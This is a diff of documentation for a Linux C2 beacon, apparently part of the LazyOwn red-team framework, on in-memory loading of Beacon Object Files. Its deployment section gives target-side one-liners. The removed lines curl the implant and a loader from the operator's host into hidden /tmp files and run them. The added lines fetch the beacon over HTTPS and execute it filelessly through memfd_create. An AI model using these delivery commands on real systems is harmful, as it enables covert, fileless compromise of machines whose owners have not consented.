@@ -10,10 +10,11 @@ On Windows, BOFs are position-independent PE COFF objects loaded by the beacon a
 runtime, giving operators an in-memory plugin system without spawning new processes.
 BlackSandBeacon ports this model to Linux:
 
-- BOFs compile as **position-independent ELF shared objects** (`.so`) with GCC
-  (`-shared -fPIC -nostartfiles`).
-- The beacon loads them at runtime via `dlopen` — no disk writes after delivery,
-  no new process, no shell.
+- BOFs compile as **position-independent ELF objects** (`.x64.o`) with GCC
+  (`-fPIC -nostdlib -m64`, one `make bof-<name>` target per object).
+- The beacon fetches the object from the C2 (`/bof/<name>.x64.o`) and loads it with
+  the native in-memory **RunELF loader** — W^X trampolines, forced stack alignment,
+  no disk writes, no new process, no shell.
 - The **`datap` API** (`BeaconDataParse`, `BeaconDataInt`, `BeaconDataExtract`,
   `BeaconPrintf`, `BeaconOutput`) is source-compatible with the Windows BOF contract,
   so existing BOF authors can port by replacing Win32 calls with Linux syscalls or
@@ -21,20 +22,24 @@ BlackSandBeacon ports this model to Linux:
 - Advanced BOFs can use **direct syscalls via inline assembly** or `io_uring` for
   kernel interaction without libc linking.
 
-### Deployment via LazyOwn
+### Deployment via LazyOwn (fileless)
 
 ```bash
-# 1. Build and stage the beacon
+# 1. Build and stage the beacon (git pull + make beacon)
 (LazyOwn) > blacksandbeacon
 
-# 2. Deliver to target (command runs on target)
-curl -sk "http://{lhost}:{lport}/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &
+# 2. Rewire the runtime config onto the LazyOwn C2 and stage the /s/ artifacts
+(LazyOwn) > beacon_deploy
 
-# 3. Build and stage the BOF loader
+# 3. Paste the printed one-liner on the target: it fetches the ELF and the
+#    config over HTTPS, memfd_create both and execve the beacon from memory.
+echo <b64> | base64 -d | BSB_STAGE_URL='https://{lhost}:{c2_port}' python3 -
+
+# 4. Build and stage the BOF objects (git pull + make bofs)
 (LazyOwn) > blacksandbeacon_bof
 
-# 4. Deliver the BOF loader to a live session
-curl -sk "http://{lhost}:{lport}/bof_loader" -o /tmp/.bof && chmod +x /tmp/.bof && /tmp/.bof
+# 5. Queue a bof: command on a live session (beacon downloads and runs it in memory)
+(LazyOwn) > bof_run whoami <beacon_id>
 ```
 
 ### Porting a Windows BOF to Linux
@@ -42,7 +47,7 @@ curl -sk "http://{lhost}:{lport}/bof_loader" -o /tmp/.bof && chmod +x /tmp/.bof 
 ```c
 // Replace Win32 API calls with direct syscalls or libc equivalents.
 // The datap API remains identical.
-#include "beacon.h"
+#include "beacon_api.h"
 
 void go(char *args, int len) {
     datap parser;
@@ -53,7 +58,7 @@ void go(char *args, int len) {
 }
 ```
 
-Compile: `gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c`
+Compile: `make bof-mybof` (gcc -c -fPIC -nostdlib -m64, output `build/bof/mybof.x64.o`)
 
 ### Adoption gap this closes
 
